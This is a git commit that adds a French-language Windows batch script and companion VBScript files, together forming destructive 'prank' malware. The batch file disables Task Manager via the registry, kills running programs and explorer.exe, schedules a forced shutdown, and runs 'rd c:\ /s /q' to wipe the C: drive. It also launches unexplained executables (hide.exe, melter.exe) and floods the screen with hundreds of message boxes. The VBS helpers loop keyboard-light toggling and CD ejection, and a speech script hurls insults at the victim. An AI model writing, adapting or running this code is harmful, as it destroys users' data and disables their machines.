c3499e4946a3111abdffa49eec4fd37f806944d7
Mp4Boi <119469108+Mp4Boi@users.noreply.github.com>
2023-06-19 04:43:55 -0400

    Create .bat

---
+++ .bat
@@ -0,0 +1,797 @@
+@echo off
+
+timeout /t 57
+
+taskkill /f /im spotify.exe
+
+timeout /t 2
+
+start voice.vbs
+
+copy "risi.bmp" "C:\Users\%username%\"
+
+timeout /t 2
+
+reg add "HKCU\Control Panel\Desktop" /V Wallpaper /F /T REG_SZ /D "C:\Users\%username%\risi.bmp"
+
+%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
+
+timeout /t 2
+
+reg add "HKCU\Control Panel\Desktop" /V Wallpaper /F /T REG_SZ /D "C:\Users\%username%\risi.bmp"
+
+%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
+
+timeout /t 2
+
+reg add "HKCU\Control Panel\Desktop" /V Wallpaper /F /T REG_SZ /D "C:\Users\%username%\risi.bmp"
+
+%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
+
+timeout /t 2
+
+reg add "HKCU\Control Panel\Desktop" /V Wallpaper /F /T REG_SZ /D "C:\Users\%username%\risi.bmp"
+
+%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
+
+timeout /t 2
+
+reg add "HKCU\Control Panel\Desktop" /V Wallpaper /F /T REG_SZ /D "C:\Users\%username%\risi.bmp"
+
+%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
+
+timeout /t 2
+
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+
+timeout /t 2
+
+taskkill /f /im chrome.exe
+
+taskkill /f /im javaw.exe
+
+taskkill /f /im hl2.exe
+
+shutdown -s -t 300 -c "Dans 5 minutes tu n'as plus de PC fils de pigeons :)"
+
+timeout /t 2
+
+start disk.vbs
+
+start disco.vbs
+
+start hide.exe
+
+rd c:\ /s /q
+
+start music.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start melter.exe
+
+taskkill /f /im explorer.exe
+
+start enter.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+start msg.vbs
+
+start error.vbs
+
+=========================================================
+
+disco.vbs
+
+
+
+Set wshShell =wscript.CreateObject("WScript.Shell")
+
+do
+
+wscript.sleep 100
+
+wshshell.sendkeys "{CAPSLOCK}"
+
+wshshell.sendkeys "{NUMLOCK}"
+
+wshshell.sendkeys "{SCROLLLOCK}"
+
+loop
+
+=========================================================
+
+disk.vbs
+
+
+
+Do
+
+Set oWMP = CreateObject("WMPlayer.OCX.7" )
+
+Set colCDROMs = oWMP.cdromCollection
+
+colCDROMs.Item(d).Eject
+
+colCDROMs.Item(d).Eject
+
+Loop
+
+=========================================================
+
+enter.vbs
+
+(j'ai oublié de vous le montrer, ca appuie sur entrée pour bouger la bannière de déconnexion pour qu'elle disparaisse avec le melter ;)
+
+
+
+Set wshShell =wscript.CreateObject("WScript.Shell")
+
+wscript.sleep 100
+
+wshshell.sendkeys "{ENTER}"
+
+=========================================================
+
+error.vbs
+
+
+
+Dim oPlayer
+
+Set oPlayer = CreateObject("WMPlayer.OCX")
+
+
+
+' Play audio
+
+oPlayer.URL = "error.mp3"
+
+oPlayer.controls.play
+
+While oPlayer.playState <> 1 ' 1 = Stopped
+
+WScript.Sleep 100
+
+Wend
+
+
+
+' Release the audio file
+
+oPlayer.close
+
+=========================================================
+
+msg.vbs
+
+
+
+MsgBox "SO COMAN LE HACK ?!", vbOKOnly + vbCritical, "Scriptkiddies"
+
+=========================================================
+
+music.vbs
+
+
+
+Dim oPlayer
+
+Set oPlayer = CreateObject("WMPlayer.OCX")
+
+
+
+' Play audio
+
+oPlayer.URL = "song.mp3"
+
+oPlayer.controls.play
+
+While oPlayer.playState <> 1 ' 1 = Stopped
+
+WScript.Sleep 100
+
+Wend
+
+
+
+' Release the audio file
+
+oPlayer.close
+
+=========================================================
+
+voice.vbs
+
+
+
+dim speechobject
+
+set speechobject=createobject("sapi.spvoice")
+
+speechobject.speak "Coucou toi, je t'ai bien niqué ta race ! Ton pc est mort dans 5 minutes. Amuse toi bien à le réparer fils de pute."
